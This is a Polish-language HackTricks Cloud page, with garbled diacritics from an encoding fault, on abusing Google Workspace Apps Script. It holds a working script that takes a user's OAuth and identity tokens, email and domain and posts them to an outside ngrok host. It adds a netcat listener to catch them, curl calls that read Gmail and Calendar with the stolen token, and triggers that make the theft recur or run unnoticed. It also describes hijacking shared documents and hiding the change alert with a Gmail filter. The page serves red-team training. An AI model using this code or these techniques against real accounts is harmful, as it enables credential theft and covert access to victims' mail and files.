# GWS - Skrypty aplikacji

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Skrypty aplikacji

Skrypty aplikacji to **kod, ktÃ³ry zostanie uruchomiony, gdy uÅ¼ytkownik o uprawnieniach edytora uzyska dostÄ™p do dokumentu, z ktÃ³rym skrypt aplikacji jest powiÄ…zany**, po **zaakceptowaniu monitu OAuth**.\
MogÄ… rÃ³wnieÅ¼ byÄ‡ ustawione do **wykonywania siÄ™ co okreÅ›lony czas** przez wÅ‚aÅ›ciciela skryptu aplikacji (trwaÅ‚oÅ›Ä‡).

### Tworzenie skryptu aplikacji

Istnieje kilka sposobÃ³w tworzenia skryptu aplikacji, chociaÅ¼ najczÄ™stsze z nich to **z dokumentu Google (dowolnego typu)** i jako **samodzielny projekt**:

<details>

<summary>UtwÃ³rz projekt powiÄ…zany z kontenerem z dokumentÃ³w Google, arkuszy lub prezentacji</summary>

1. OtwÃ³rz dokument Docs, arkusz Sheets lub prezentacjÄ™ Slides.
2. Kliknij **Rozszerzenia** > **Skrypty Google Apps**.
3. W edytorze skryptÃ³w kliknij **Nieopisany projekt**.
4. Nadaj swojemu projektowi nazwÄ™ i kliknij **ZmieÅ„ nazwÄ™**.

</details>

<details>

<summary>UtwÃ³rz samodzielny projekt</summary>

Aby utworzyÄ‡ samodzielny projekt z Apps Script:

1. PrzejdÅº do [`script.google.com`](https://script.google.com/).
2. Kliknij **Nowy projekt**.
3. W edytorze skryptÃ³w kliknij **Nieopisany projekt**.
4. Nadaj swojemu projektowi nazwÄ™ i kliknij **ZmieÅ„ nazwÄ™**.

</details>

<details>

<summary>UtwÃ³rz samodzielny projekt z Google Drive</summary>

1. OtwÃ³rz [Google Drive](https://drive.google.com/).
2. Kliknij **Nowy** > **WiÄ™cej** > **Skrypty Google Apps**.

</details>

<details>

<summary>UtwÃ³rz projekt powiÄ…zany z kontenerem z formularzy Google</summary>

1. OtwÃ³rz formularz w Google Forms.
2. Kliknij WiÄ™cej more\_vert > **Edytor skryptÃ³w**.
3. W edytorze skryptÃ³w kliknij **Nieopisany projekt**.
4. Nadaj swojemu projektowi nazwÄ™ i kliknij **ZmieÅ„ nazwÄ™**.

</details>

<details>

<summary>UtwÃ³rz samodzielny projekt za pomocÄ… narzÄ™dzia wiersza poleceÅ„ clasp</summary>

`clasp` to narzÄ™dzie wiersza poleceÅ„, ktÃ³re umoÅ¼liwia tworzenie, pobieranie/pchanie i wdraÅ¼anie projektÃ³w Apps Script z terminala.

Zobacz [Przewodnik po interfejsie wiersza poleceÅ„ za pomocÄ… narzÄ™dzia `clasp`](https://developers.google.com/apps-script/guides/clasp) dla wiÄ™cej szczegÃ³Å‚Ã³w.

</details>

## Scenariusz skryptu aplikacji <a href="#create-using-clasp" id="create-using-clasp"></a>

### UtwÃ³rz arkusz Google z skryptem aplikacji

Zacznij od utworzenia skryptu aplikacji, moja rekomendacja dla tego scenariusza to utworzenie arkusza Google i przejÅ›cie do **`Rozszerzenia > Skrypty aplikacji`**, co spowoduje otwarcie **nowego skryptu aplikacji powiÄ…zanego z arkuszem**.

### Wyciek tokena

Aby umoÅ¼liwiÄ‡ dostÄ™p do tokenu OAuth, musisz kliknÄ…Ä‡ **`UsÅ‚ugi +` i dodaÄ‡ zakresy takie jak**:

* **AdminDirectory**: DostÄ™p do uÅ¼ytkownikÃ³w i grup katalogu (jeÅ›li uÅ¼ytkownik ma wystarczajÄ…ce uprawnienia)
* **Gmail**: DostÄ™p do danych Gmaila
* **Drive**: DostÄ™p do danych dysku
* **Google Sheets API**: DziaÅ‚a z wyzwalaczem

Aby samodzielnie zmieniÄ‡ **wymagane zakresy**, moÅ¼esz przejÅ›Ä‡ do ustawieÅ„ projektu i **wÅ‚Ä…czyÄ‡ opcjÄ™ `PokaÅ¼ plik manifestu "appsscript.json" w edytorze`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Aby przechwyciÄ‡ Å¼Ä…danie, wystarczy uruchomiÄ‡:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
### Uprawnienia Å¼Ä…dane do wykonania skryptu aplikacji:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Podczas zewnÄ™trznego Å¼Ä…dania, monit OAuth rÃ³wnieÅ¼ **poprosi o zgodÄ™ na dostÄ™p do zewnÄ™trznych punktÃ³w koÅ„cowych**.
{% endhint %}

### Tworzenie wyzwalacza

Po odczytaniu aplikacji, kliknij **â° Wyzwalacze**, aby utworzyÄ‡ wyzwalacz. Jako **funkcjÄ™** do uruchomienia wybierz **`getToken`**, uruchamiaj przy wdroÅ¼eniu **`Head`**, w ÅºrÃ³dle zdarzenia wybierz **`Z arkusza kalkulacyjnego`**, a typ zdarzenia wybierz **`Przy otwarciu`** lub **`Przy edycji`** (w zaleÅ¼noÅ›ci od potrzeb) i zapisz.

ZauwaÅ¼, Å¼e moÅ¼esz sprawdziÄ‡ **uruchomienia skryptÃ³w aplikacji w zakÅ‚adce Wykonania**, jeÅ›li chcesz coÅ› debugowaÄ‡.

### UdostÄ™pnianie

Aby **uruchomiÄ‡** **skrypt aplikacji**, ofiara musi poÅ‚Ä…czyÄ‡ siÄ™ z dostÄ™pem **Edytora**.

PodsumowujÄ…c, jeÅ›li twÃ³rca i zaproszony uÅ¼ytkownik sÄ… **z tej samej organizacji**, **token OAuth** bÄ™dzie **naleÅ¼aÅ‚** do **uÅ¼ytkownika**, ktÃ³ry uzyskuje dostÄ™p do pliku.\
JeÅ›li sÄ… z **rÃ³Å¼nych organizacji**, **token** bÄ™dzie naleÅ¼aÅ‚ do **twÃ³rcy wyzwalacza**, zawsze z **tylko uprawnieniami OAuth**, ktÃ³re zostaÅ‚y udzielone podczas tworzenia wyzwalacza.

{% hint style="success" %}
**Token** uÅ¼ywany do wykonania **skryptu aplikacji** bÄ™dzie naleÅ¼aÅ‚ do **twÃ³rcy wyzwalacza**, nawet jeÅ›li plik jest otwarty jako Edytor przez innych uÅ¼ytkownikÃ³w.
{% endhint %}

### NaduÅ¼ywanie dokumentÃ³w udostÄ™pnionych w folderze "UdostÄ™pnione ze mnÄ…"

{% hint style="danger" %}
JeÅ›li ktoÅ› **udostÄ™pniÅ‚ ci dokument z skryptami aplikacji i wyzwalaczem, uÅ¼ywajÄ…c "Head"** skryptu aplikacji (a nie staÅ‚ego wdroÅ¼enia), moÅ¼esz zmodyfikowaÄ‡ kod skryptu aplikacji (dodajÄ…c na przykÅ‚ad funkcje kradzieÅ¼y tokenÃ³w), uzyskaÄ‡ do niego dostÄ™p, a **skrypt aplikacji zostanie wykonany z uprawnieniami uÅ¼ytkownika, ktÃ³ry udostÄ™pniÅ‚ dokument**! (zauwaÅ¼, Å¼e token OAuth wÅ‚aÅ›ciciela bÄ™dzie miaÅ‚ zakresy dostÄ™pu okreÅ›lone podczas tworzenia wyzwalacza).

**Powiadomienie zostanie wysÅ‚ane do twÃ³rcy skryptu, informujÄ…c, Å¼e ktoÅ› zmodyfikowaÅ‚ skrypt** (A co powiesz na wykorzystanie uprawnieÅ„ Gmail do wygenerowania filtru, ktÃ³ry zapobiegnie alertowi?)
{% endhint %}

{% hint style="success" %}
JeÅ›li **atakujÄ…cy zmieni zakresy skryptu aplikacji**, aktualizacje **nie zostanÄ… zastosowane** do dokumentu, dopÃ³ki nie zostanie utworzony **nowy wyzwalacz** z wprowadzonymi zmianami. Dlatego atakujÄ…cy nie bÄ™dzie w stanie ukraÅ›Ä‡ tokena wÅ‚aÅ›ciciela z wiÄ™kszymi zakresami niÅ¼ te, ktÃ³re ustawiÅ‚ w utworzonym przez siebie wyzwalaczu.
{% endhint %}

### Kopiowanie zamiast udostÄ™pniania

Podczas tworzenia linku do udostÄ™pnienia dokumentu, tworzony jest link podobny do tego: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
JeÅ›li **zmienisz** koÅ„cÃ³wkÄ™ **"/edit"** na **"/copy"**, zamiast uzyskaÄ‡ do niego dostÄ™p, Google zapyta, czy chcesz **wygenerowaÄ‡ kopiÄ™ dokumentu**:

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

JeÅ›li uÅ¼ytkownik utworzy kopiÄ™ i uzyska do niej dostÄ™p, **zawartoÅ›Ä‡ dokumentu i skrypty aplikacji zostanÄ… skopiowane**, ale **wyzwalacze nie zostanÄ…**, dlatego **nic nie zostanie wykonane**.

### UdostÄ™pnianie jako aplikacja internetowa

NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e moÅ¼na rÃ³wnieÅ¼ **udostÄ™pniÄ‡ skrypt aplikacji jako aplikacjÄ™ internetowÄ…** (w Edytorze skryptu aplikacji, wdroÅ¼yÄ‡ jako aplikacjÄ™ internetowÄ…), ale pojawi siÄ™ taki alert:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

NastÄ™pnie pojawi siÄ™ **typowy monit OAuth**, pytajÄ…cy o wymagane uprawnienia.

### Testowanie

MoÅ¼esz przetestowaÄ‡ zebrany token, aby wyÅ›wietliÄ‡ emaile za pomocÄ…:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lista kalendarza uÅ¼ytkownika:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script jako trwaÅ‚oÅ›Ä‡

JednÄ… z opcji trwaÅ‚oÅ›ci jest **utworzenie dokumentu i dodanie wyzwalacza dla funkcji getToken**, a nastÄ™pnie udostÄ™pnienie dokumentu atakujÄ…cemu, aby za kaÅ¼dym razem, gdy atakujÄ…cy otworzy plik, **wyciekÅ‚ token ofiary**.

MoÅ¼liwe jest rÃ³wnieÅ¼ utworzenie App Script i ustawienie go jako wyzwalacz, ktÃ³ry bÄ™dzie uruchamiany co pewien czas (na przykÅ‚ad co minutÄ™, godzinÄ™, dzieÅ„...). AtakujÄ…cy, ktÃ³ry **uzyskaÅ‚ dostÄ™p do poÅ›wiadczeÅ„ lub sesji ofiary**, moÅ¼e ustawiÄ‡ wyzwalacz czasowy dla App Script i **wyciekaÄ‡ bardzo uprzywilejowany token OAuth codziennie**:

Po prostu utwÃ³rz App Script, przejdÅº do Wyzwalaczy, kliknij Dodaj wyzwalacz i wybierz jako ÅºrÃ³dÅ‚o zdarzenia Wyzwalane czasowo, a nastÄ™pnie wybierz opcje, ktÃ³re najlepiej pasujÄ… do Twoich potrzeb:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Spowoduje to wysÅ‚anie alertu bezpieczeÅ„stwa na e-mail i powiadomienie push na telefon o tym zdarzeniu.
{% endhint %}



### OminiÄ™cie niezweryfikowanego monitu udostÄ™pnionego dokumentu

Ponadto, jeÅ›li ktoÅ› **udostÄ™pniÅ‚** Ci dokument z **uprawnieniami edytora**, moÅ¼esz generowaÄ‡ **App Scripty wewnÄ…trz dokumentu**, a **WÅAÅšCICIEL (twÃ³rca) dokumentu bÄ™dzie wÅ‚aÅ›cicielem App Scriptu**.

{% hint style="warning" %}
Oznacza to, Å¼e **twÃ³rca dokumentu bÄ™dzie wyÅ›wietlany jako twÃ³rca kaÅ¼dego App Scriptu**, ktÃ³ry zostanie utworzony przez osobÄ™ z uprawnieniami edytora.

Oznacza to rÃ³wnieÅ¼, Å¼e **App Script bÄ™dzie uznawany za zaufany przez Å›rodowisko Workspace** twÃ³rcy dokumentu.
{% endhint %}

{% hint style="danger" %}
Oznacza to rÃ³wnieÅ¼, Å¼e jeÅ›li **App Script juÅ¼ istnieje** i ludzie **udzielili dostÄ™pu**, kaÅ¼da osoba z uprawnieniami **Edytuj** w dokumencie moÅ¼e go **modyfikowaÄ‡ i naduÅ¼ywaÄ‡ tego dostÄ™pu**.\
Aby naduÅ¼yÄ‡ tego, potrzebujesz rÃ³wnieÅ¼, aby ludzie wywoÅ‚ali App Script. I jednym sprytnym trikiem jest **opublikowanie skryptu jako aplikacji internetowej**. Kiedy **ludzie**, ktÃ³rzy juÅ¼ **udzielili dostÄ™pu** do App Scriptu, wejdÄ… na stronÄ™ internetowÄ…, wywoÅ‚ajÄ… **App Script** (to dziaÅ‚a rÃ³wnieÅ¼ za pomocÄ… znacznikÃ³w `<img>`).
{% endhint %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriÃ³w na GitHubie**.

</details>
